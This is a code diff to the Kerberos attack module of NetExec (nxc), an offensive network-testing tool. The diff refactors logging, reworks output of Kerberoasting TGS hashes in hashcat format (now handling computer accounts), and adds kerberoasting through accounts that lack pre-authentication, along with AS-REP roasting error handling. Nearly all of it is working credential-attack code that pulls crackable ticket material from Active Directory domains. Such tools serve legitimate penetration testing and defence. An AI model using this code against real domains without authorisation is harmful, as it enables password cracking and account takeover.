@@ -20,8 +20,6 @@ from impacket.ntlm import compute_lmhash, compute_nthash
 from pyasn1.codec.der import decoder, encoder
 from pyasn1.type.univ import noValue
 
-from nxc.logger import nxc_logger
-
 
 class KerberosAttacks:
     def __init__(self, connection):
@@ -37,6 +35,8 @@ class KerberosAttacks:
         self.kdcHost = connection.kdcHost
         self.kerberos = connection.kerberos
 
+        self.logger = connection.logger
+
         if self.hash is not None:
             if self.hash.find(":") != -1:
                 self.lmhash, self.nthash = self.hash.split(":")
@@ -46,7 +46,7 @@ class KerberosAttacks:
         if self.password is None:
             self.password = ""
 
-    def output_tgs(self, tgs, old_session_key, session_key, username, spn, fd=None):
+    def output_tgs(self, tgs, old_session_key, session_key, username, spn, fd=None, is_computer=False):
         decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
 
         # According to RFC4757 (RC4-HMAC) the cipher part is like:
@@ -63,68 +63,87 @@ class KerberosAttacks:
         # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
         # last 12 bytes of the encrypted ticket represent the checksum of the decrypted
         # ticket
-        if decoded_tgs["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.rc4_hmac.value:
-            entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
-                constants.EncryptionTypes.rc4_hmac.value,
-                username,
-                decoded_tgs["ticket"]["realm"],
-                spn.replace(":", "~"),
-                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][:16].asOctets()).decode(),
-                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][16:].asOctets()).decode(),
-            )
-        elif decoded_tgs["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
-            entry = "$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (
-                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
-                username,
-                decoded_tgs["ticket"]["realm"],
-                spn.replace(":", "~"),
-                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][-12:].asOctets()).decode(),
-                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][:-12:].asOctets()).decode,
-            )
-        elif decoded_tgs["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
-            entry = "$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (
-                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
-                username,
-                decoded_tgs["ticket"]["realm"],
-                spn.replace(":", "~"),
-                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][-12:].asOctets()).decode(),
-                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][:-12:].asOctets()).decode(),
-            )
-        elif decoded_tgs["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.des_cbc_md5.value:
-            entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
-                constants.EncryptionTypes.des_cbc_md5.value,
-                username,
-                decoded_tgs["ticket"]["realm"],
-                spn.replace(":", "~"),
-                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][:16].asOctets()).decode(),
-                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][16:].asOctets()).decode(),
-            )
-        else:
-            nxc_logger.error(f"Skipping {decoded_tgs['ticket']['sname']['name-string'][0]}/{decoded_tgs['ticket']['sname']['name-string'][1]} due to incompatible e-type {decoded_tgs['ticket']['enc-part']['etype']:d}")
 
+        # Define variables
+        enc = decoded_tgs["ticket"]["enc-part"]
+        etype = enc["etype"]
+        cipher = enc["cipher"].asOctets()
+        realm = decoded_tgs["ticket"]["realm"]
+        spn_fmt = spn.replace(":", "~")
+
+        # Replace username if it's a computer account
+        if is_computer:
+            account = f"host{username.rstrip('$').lower()}.{str(realm).lower()}"
+        else:
+            if username.endswith("$"):
+                self.logger.fail("Account ends with $, but is_computer is False. TGS output is likely to be incorrect.")
+            account = username
+
+        if etype in (constants.EncryptionTypes.rc4_hmac.value, constants.EncryptionTypes.des_cbc_md5.value):
+            chk = hexlify(cipher[:16]).decode()
+            data = hexlify(cipher[16:]).decode()
+            entry = f"$krb5tgs${etype}$*{account}${realm}${spn_fmt}*${chk}${data}"
+        elif etype in (constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value):
+            chk = hexlify(cipher[-12:]).decode()
+            data = hexlify(cipher[:-12]).decode()
+            entry = f"$krb5tgs${etype}${account}${realm}$*{spn_fmt}*${chk}${data}"
+        else:
+            self.logger.fail(f"Skipping {decoded_tgs['ticket']['sname']['name-string'][0]}/{decoded_tgs['ticket']['sname']['name-string'][1]} due to incompatible e-type {decoded_tgs['ticket']['enc-part']['etype']:d}")
+
+        return entry
+
+    def output_tgs_from_asrep(self, asrep_blob, spn, fd=None):
+        asrep = decoder.decode(asrep_blob, asn1Spec=AS_REP())[0]
+        realm = self.domain.upper()
+        enc = asrep["ticket"]["enc-part"]
+        etype = enc["etype"]
+        cipher = enc["cipher"].asOctets()
+
+        service = spn.split("/")[0]
+        spn_fmt = spn.replace(":", "~")
+
+        if etype == constants.EncryptionTypes.rc4_hmac.value:  # 23
+            chk = hexlify(cipher[:16]).decode()
+            data = hexlify(cipher[16:]).decode()
+            entry = f"$krb5tgs${etype}$*{service}${realm}${spn_fmt}*${chk}${data}"
+
+        elif etype in (
+            constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,  # 17
+            constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,  # 18
+        ):
+            chk = hexlify(cipher[-12:]).decode()
+            data = hexlify(cipher[:-12]).decode()
+            entry = f"$krb5tgs${etype}${service}${realm}$*{spn_fmt}*${chk}${data}"
+
+        else:
+            self.logger.fail(f"[{spn}] etype {etype} not supported")
+            return None
+
+        if fd:
+            fd.write(entry + "\n")
         return entry
 
     def get_tgt_kerberoasting(self, kcache=None):
         if kcache:
             if getenv("KRB5CCNAME"):
-                nxc_logger.debug("KRB5CCNAME environment variable exists, attempting to use that...")
+                self.logger.debug("KRB5CCNAME environment variable exists, attempting to use that...")
                 try:
                     ccache = CCache.loadFile(getenv("KRB5CCNAME"))
                     # retrieve user and domain information from CCache file if needed
                     domain = ccache.principal.realm["data"] if self.domain == "" else self.domain
-                    nxc_logger.debug(f"Using Kerberos Cache: {getenv('KRB5CCNAME')}")
+                    self.logger.debug(f"Using Kerberos Cache: {getenv('KRB5CCNAME')}")
                     principal = f"krbtgt/{domain.upper()}@{domain.upper()}"
                     creds = ccache.getCredential(principal)
                     if creds is not None:
                         tgt = creds.toTGT()
-                        nxc_logger.debug("Using TGT from cache")
+                        self.logger.debug("Using TGT from cache")
                         return tgt
                     else:
-                        nxc_logger.debug("No valid credentials found in cache")
+                        self.logger.debug("No valid credentials found in cache")
                 except Exception:
                     pass
             else:
-                nxc_logger.fail("KRB5CCNAME environment variable not found, unable to use Kerberos Cache")
+                self.logger.fail("KRB5CCNAME environment variable not found, unable to use Kerberos Cache")
 
         # No TGT in cache, request it
         user_name = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -146,12 +165,12 @@ class KerberosAttacks:
                 )
             except OSError as e:
                 if e.errno == 113:
-                    nxc_logger.fail(f"Unable to resolve KDC hostname: {e!s}")
+                    self.logger.fail(f"Unable to resolve KDC hostname: {e!s}")
                 else:
-                    nxc_logger.fail(f"Some other OSError occured: {e!s}")
+                    self.logger.fail(f"Some other OSError occured: {e!s}")
                 return None
             except Exception as e:
-                nxc_logger.debug(f"TGT: {e!s}")
+                self.logger.debug(f"TGT: {e!s}")
                 tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                     user_name,
                     self.password,
@@ -175,8 +194,30 @@ class KerberosAttacks:
         tgt_data["KDC_REP"] = tgt
         tgt_data["cipher"] = cipher
         tgt_data["sessionKey"] = sessionKey
-        nxc_logger.debug(f"Final TGT: {tgt_data}")
+        self.logger.debug(f"Final TGT: {tgt_data}")
         return tgt_data
+
+    def get_tgs_no_preauth(self, no_preauth_user, spn):
+        no_pre_princ = Principal(no_preauth_user,
+                                type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+        try:
+            ticket, _cipher, _old, _sess = getKerberosTGT(
+                clientName=no_pre_princ,
+                password="",
+                domain=self.domain,
+                lmhash=b"",
+                nthash=b"",
+                aesKey="",
+                kdcHost=self.kdcHost,
+                serverName=spn,
+                kerberoast_no_preauth=True
+            )
+        except Exception as e:
+            self.logger.debug(f"Unable to retrieve the ticket for {spn} via {no_preauth_user}: {e}")
+            return None
+
+        return self.output_tgs_from_asrep(ticket, spn)
 
     def get_tgt_asroast(self, userName, requestPAC=True):
         client_name = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -208,7 +249,7 @@ class KerberosAttacks:
         seq_set(req_body, "cname", client_name.components_to_asn1)
 
         if domain == "":
-            nxc_logger.error("Empty Domain not allowed in Kerberos")
+            self.logger.error("Empty Domain not allowed in Kerberos")
             return None
 
         req_body["realm"] = domain
@@ -239,12 +280,17 @@ class KerberosAttacks:
                 )
                 seq_set_iter(req_body, "etype", supported_ciphers)
                 message = encoder.encode(as_req)
-                r = sendReceive(message, domain, self.kdcHost)
+                try:
+                    r = sendReceive(message, domain, self.kdcHost)
+                except KerberosError as e:
+                    self.logger.fail(e)
+                    self.logger.debug(traceback.format_exc())
+                    return None
             elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_KEY_EXPIRED.value:
                 return f"Password of user {userName} expired but user doesn't require pre-auth"
             else:
-                nxc_logger.fail(e)
-                nxc_logger.debug(traceback.format_exc())
+                self.logger.fail(e)
+                self.logger.debug(traceback.format_exc())
                 return None
 
         # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
@@ -256,7 +302,7 @@ class KerberosAttacks:
             as_rep = decoder.decode(r, asn1Spec=AS_REP())[0]
         else:
             # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
-            nxc_logger.debug(f"User {userName} doesn't have UF_DONT_REQUIRE_PREAUTH set")
+            self.logger.debug(f"User {userName} doesn't have UF_DONT_REQUIRE_PREAUTH set")
             return None
 
         # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
